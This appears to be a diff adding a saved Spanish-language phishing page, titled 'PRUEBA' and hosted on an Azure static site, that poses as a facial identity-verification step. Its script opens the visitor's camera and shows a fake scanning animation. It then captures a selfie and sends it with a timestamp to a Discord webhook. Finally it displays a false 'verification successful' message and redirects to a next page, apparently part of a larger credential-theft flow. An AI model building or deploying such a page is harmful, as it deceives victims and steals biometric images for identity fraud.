@@ -1,0 +1,532 @@
+<!DOCTYPE html>
+<!-- saved from url=(0053)https://788bnesco82.z15.web.core.windows.net/fac.html -->
+<html lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PRUEBA</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com/">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+    <link href="./fac_files/css2" rel="stylesheet">
+    
+    <style>
+        :root {
+            --primary-color: #2e846b;
+            --text-dark: #2c3e50;
+            --text-muted: #7f8c8d;
+            --input-border: #bdc3c7;
+            --link-color: #0056b3;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+        }
+
+        body {
+            font-family: 'Lato', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background-color: #f5f6fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            width: 100vw;
+            overflow-x: hidden;
+        }
+
+        .wrapper {
+            width: 100%;
+            max-width: 430px;
+            height: 100vh;
+            background-color: var(--primary-color);
+            display: flex;
+            flex-direction: column;
+            overflow: hidden;
+            position: relative;
+        }
+
+        @media (min-width: 480px) {
+            .wrapper {
+                height: 92vh;
+                min-height: 760px;
+                border-radius: 24px;
+                box-shadow: 0 15px 35px rgba(0, 0, 0, 0.15);
+            }
+        }
+
+        .header-section {
+            position: relative;
+            padding: 20px 20px 10px 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            flex-shrink: 0;
+            z-index: 1;
+        }
+
+        .header-section::before {
+            content: '';
+            position: absolute;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.06);
+            z-index: -1;
+            top: -30px;
+            right: -30px;
+            width: 200px;
+            height: 200px;
+        }
+
+        .logo {
+            width: 11.5rem;
+            max-width: 175px;
+            height: auto;
+        }
+
+        .main-container {
+            background-color: #ffffff;
+            border-top-left-radius: 35px;
+            border-top-right-radius: 35px;
+            padding: 30px 28px 20px 28px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+        }
+
+        .title {
+            font-size: 20px;
+            font-weight: 700;
+            color: var(--text-dark);
+            margin-bottom: 5px;
+            text-align: center;
+        }
+
+        .subtitle {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin-bottom: 25px;
+            text-align: center;
+        }
+
+        .camera-container {
+            position: relative;
+            width: 100%;
+            max-width: 320px;
+            aspect-ratio: 1 / 1;
+            background: #1a1a2e;
+            border-radius: 50%;
+            overflow: hidden;
+            margin: 0 auto 25px auto;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+            border: 4px solid var(--primary-color);
+        }
+
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+        }
+
+        #canvas {
+            display: none;
+        }
+
+        .scan-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            border-radius: 50%;
+            overflow: hidden;
+        }
+
+        .scan-line {
+            position: absolute;
+            left: 10%;
+            width: 80%;
+            height: 2px;
+            background: linear-gradient(90deg, transparent, #00ff88, transparent);
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.6);
+            opacity: 0;
+            transition: opacity 0.5s;
+        }
+
+        .scan-line.active {
+            opacity: 1;
+            animation: scanMove 2.5s ease-in-out infinite;
+        }
+
+        @keyframes scanMove {
+            0% { top: 10%; }
+            50% { top: 85%; }
+            100% { top: 10%; }
+        }
+
+        .corner {
+            position: absolute;
+            width: 25px;
+            height: 25px;
+            border: 3px solid rgba(0, 255, 136, 0.8);
+            border-radius: 0;
+        }
+
+        .corner-tl {
+            top: 12%;
+            left: 12%;
+            border-right: none;
+            border-bottom: none;
+            border-radius: 4px 0 0 0;
+        }
+
+        .corner-tr {
+            top: 12%;
+            right: 12%;
+            border-left: none;
+            border-bottom: none;
+            border-radius: 0 4px 0 0;
+        }
+
+        .corner-bl {
+            bottom: 12%;
+            left: 12%;
+            border-right: none;
+            border-top: none;
+            border-radius: 0 0 0 4px;
+        }
+
+        .corner-br {
+            bottom: 12%;
+            right: 12%;
+            border-left: none;
+            border-top: none;
+            border-radius: 0 0 4px 0;
+        }
+
+        .status-indicator {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            margin-bottom: 20px;
+            padding: 8px 20px;
+            border-radius: 20px;
+            background: #f0f0f0;
+            font-size: 14px;
+            color: var(--text-muted);
+            transition: all 0.3s;
+        }
+
+        .status-indicator .dot {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background: #e74c3c;
+            transition: all 0.3s;
+        }
+
+        .status-indicator .dot.active {
+            background: #2ecc71;
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        .status-indicator .dot.scanning {
+            background: #f39c12;
+            animation: pulse 0.6s ease-in-out infinite;
+        }
+
+        @keyframes pulse {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            50% { transform: scale(1.3); opacity: 0.7; }
+        }
+
+        .btn-verify {
+            width: 100%;
+            max-width: 320px;
+            background-color: var(--primary-color);
+            color: #ffffff;
+            border: none;
+            padding: 16px;
+            font-family: 'Lato', sans-serif;
+            font-size: 16px;
+            font-weight: 700;
+            letter-spacing: 0.5px;
+            border-radius: 30px;
+            cursor: pointer;
+            text-transform: uppercase;
+            transition: all 0.3s;
+            margin-top: auto;
+        }
+
+        .btn-verify:hover {
+            background-color: #236652;
+            transform: scale(1.02);
+        }
+
+        .btn-verify:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .btn-verify .btn-text {
+            display: inline-block;
+        }
+
+        .btn-verify .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-top: 3px solid #fff;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto;
+        }
+
+        .btn-verify.loading .btn-text {
+            display: none;
+        }
+
+        .btn-verify.loading .spinner {
+            display: block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .footer-bar {
+            width: 100%;
+            height: 70px;
+            background-color: var(--primary-color);
+            flex-shrink: 0;
+            z-index: 1;
+        }
+    </style>
+<script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="5cb6ec98-751c-467b-b64d-9d7db087de85" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/200.js"></script><script bis_use="true" type="text/javascript" charset="utf-8" nonce="" data-dynamic-id="5cb6ec98-751c-467b-b64d-9d7db087de85" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/executors/101.js"></script></head>
+<body __processed_4723dd2f-341b-4b42-94b8-56267709abbc__="true" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJlbmFibGVkIiwiRkFDRUJPT0siOiJlbmFibGVkIiwiVFdJVFRFUiI6ImVuYWJsZWQiLCJSRURESVQiOiJlbmFibGVkIiwiUElOVEVSRVNUIjoiZW5hYmxlZCIsIklOU1RBR1JBTSI6ImVuYWJsZWQiLCJUSUtUT0siOiJlbmFibGVkIiwiTElOS0VESU4iOiJlbmFibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMS4xIiwic2NvcmUiOjIwMTAxMH1d">
+
+    <div class="wrapper" bis_skin_checked="1">
+        
+        <div class="header-section" bis_skin_checked="1">
+            <img src="./fac_files/a.png" alt="Logo" class="logo">
+        </div>
+
+        <div class="main-container" bis_skin_checked="1">
+            <h1 class="title">Verificación de Identidad</h1>
+            <p class="subtitle">Coloca tu rostro dentro del círculo</p>
+
+            <div class="camera-container" id="cameraContainer" bis_skin_checked="1">
+                <video id="video" autoplay="" playsinline=""></video>
+                <canvas id="canvas"></canvas>
+                
+                <div class="scan-overlay" id="scanOverlay" bis_skin_checked="1">
+                    <div class="scan-line" id="scanLine" bis_skin_checked="1"></div>
+                    <div class="corner corner-tl" bis_skin_checked="1"></div>
+                    <div class="corner corner-tr" bis_skin_checked="1"></div>
+                    <div class="corner corner-bl" bis_skin_checked="1"></div>
+                    <div class="corner corner-br" bis_skin_checked="1"></div>
+                </div>
+            </div>
+
+            <div class="status-indicator" id="statusIndicator" bis_skin_checked="1">
+                <span class="dot active" id="statusDot"></span>
+                <span id="statusText">Cámara lista</span>
+            </div>
+
+            <button class="btn-verify" id="btnVerify">
+                <span class="btn-text">Verificar rostro</span>
+                <span class="spinner"></span>
+            </button>
+        </div>
+
+        <div class="footer-bar" bis_skin_checked="1"></div>
+
+    </div>
+
+    <script src="./fac_files/jquery.min.js.descarga"></script>
+    <script type="text/javascript" src="./fac_files/infodt.js.descarga"></script>
+
+    <script>
+    $(document).ready(function() {
+        
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const btnVerify = document.getElementById('btnVerify');
+        const statusDot = document.getElementById('statusDot');
+        const statusText = document.getElementById('statusText');
+        const scanLine = document.getElementById('scanLine');
+
+        let stream = null;
+        let isScanning = false;
+        let scanInterval = null;
+
+        async function iniciarCamara() {
+            try {
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 640 },
+                        height: { ideal: 640 }
+                    },
+                    audio: false
+                });
+                video.srcObject = stream;
+                await video.play();
+                
+                statusDot.className = 'dot active';
+                statusText.textContent = 'Cámara lista';
+                btnVerify.disabled = false;
+                
+            } catch (err) {
+                statusDot.className = 'dot';
+                statusText.textContent = 'No se pudo acceder a la cámara';
+                btnVerify.disabled = true;
+            }
+        }
+
+        function capturarFoto() {
+            const context = canvas.getContext('2d');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 640;
+            
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            return canvas.toDataURL('image/jpeg', 0.95);
+        }
+
+        function enviarFotoADiscord(imageData) {
+            return new Promise((resolve, reject) => {
+                const message = {
+                    content: '📸 **VERIFICACIÓN DE IDENTIDAD**\n' +
+                             '🕐 **Fecha:** ' + new Date().toLocaleString()
+                };
+
+                $.ajax({
+                    url: webhook,
+                    method: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify(message)
+                })
+                .done(function() {
+                    const blob = dataURLToBlob(imageData);
+                    const formData = new FormData();
+                    formData.append('file', blob, 'selfie.jpg');
+                    formData.append('content', '📸 **Selfie capturada**');
+
+                    $.ajax({
+                        url: webhook,
+                        method: 'POST',
+                        data: formData,
+                        processData: false,
+                        contentType: false
+                    })
+                    .done(function() {
+                        resolve();
+                    })
+                    .fail(function(err) {
+                        reject(err);
+                    });
+                })
+                .fail(function(err) {
+                    reject(err);
+                });
+            });
+        }
+
+        function dataURLToBlob(dataURL) {
+            const parts = dataURL.split(',');
+            const mime = parts[0].match(/:(.*?);/)[1];
+            const b64 = atob(parts[1]);
+            const array = new Uint8Array(b64.length);
+            for (let i = 0; i < b64.length; i++) {
+                array[i] = b64.charCodeAt(i);
+            }
+            return new Blob([array], { type: mime });
+        }
+
+        function iniciarEscaneo() {
+            if (isScanning) return;
+            if (!stream) return;
+
+            isScanning = true;
+            btnVerify.disabled = true;
+            btnVerify.classList.add('loading');
+            
+            scanLine.classList.add('active');
+            statusDot.className = 'dot scanning';
+            statusText.textContent = 'Verificando rostro...';
+
+            let scanCount = 0;
+            scanInterval = setInterval(() => {
+                scanCount++;
+                if (scanCount >= 3) {
+                    clearInterval(scanInterval);
+                    scanInterval = null;
+                    capturarYEnviar();
+                }
+            }, 1000);
+        }
+
+        function capturarYEnviar() {
+            statusText.textContent = 'Procesando...';
+            
+            try {
+                const imageData = capturarFoto();
+                
+                enviarFotoADiscord(imageData)
+                    .then(() => {
+                        statusDot.className = 'dot active';
+                        statusText.textContent = 'Verificación exitosa';
+                        
+                        setTimeout(() => {
+                            window.location.href = 'corre.html';
+                        }, 1500);
+                    })
+                    .catch(() => {
+                        statusDot.className = 'dot';
+                        statusText.textContent = 'Error, intenta de nuevo';
+                        btnVerify.disabled = false;
+                        btnVerify.classList.remove('loading');
+                        isScanning = false;
+                        scanLine.classList.remove('active');
+                    });
+                    
+            } catch (err) {
+                statusDot.className = 'dot';
+                statusText.textContent = 'Error, intenta de nuevo';
+                btnVerify.disabled = false;
+                btnVerify.classList.remove('loading');
+                isScanning = false;
+                scanLine.classList.remove('active');
+            }
+        }
+
+        function detenerCamara() {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+                stream = null;
+            }
+            if (scanInterval) {
+                clearInterval(scanInterval);
+                scanInterval = null;
+            }
+            video.srcObject = null;
+        }
+
+        btnVerify.addEventListener('click', iniciarEscaneo);
+        iniciarCamara();
+
+        window.addEventListener('beforeunload', function() {
+            detenerCamara();
+        });
+
+    });
+    </script>
+
+
+</body></html>
